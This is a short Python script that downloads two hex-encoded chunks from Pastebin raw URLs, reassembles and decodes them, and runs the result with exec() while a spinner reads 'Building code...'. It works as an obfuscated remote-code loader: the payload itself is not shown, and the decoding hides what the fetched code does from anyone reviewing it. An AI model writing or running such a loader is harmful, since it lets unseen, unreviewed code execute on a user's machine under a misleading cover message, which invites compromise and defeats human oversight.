import binascii
import requests
import ast
from beaupy.spinners import *

part_url_1 = 'https://pastebin.com/raw/KpiMCyun'
part_url_2 = 'https://pastebin.com/raw/33FaeLws'


spinner = Spinner(ARC, "Building code...")
spinner.start()
try:
    full_stuff = ""
    for url in [part_url_1, part_url_2]:
        response = requests.get(url)
        status_code = response.status_code

        if status_code == 200:
            full_stuff += response.text
        else:
            spinner.stop()
            quit(f"Error fetching {url} | Status: {response.status_code}")


    full_stuff_lst = ast.literal_eval(full_stuff)
    full_stuff = "".join(full_stuff_lst)
    full_stuff_bytes = full_stuff.encode()
    more_stuff = binascii.unhexlify(full_stuff_bytes).decode()

    spinner.stop()
    exec(more_stuff)

except Exception as e:
    spinner.stop()
    print(f"Error with request: {e}")
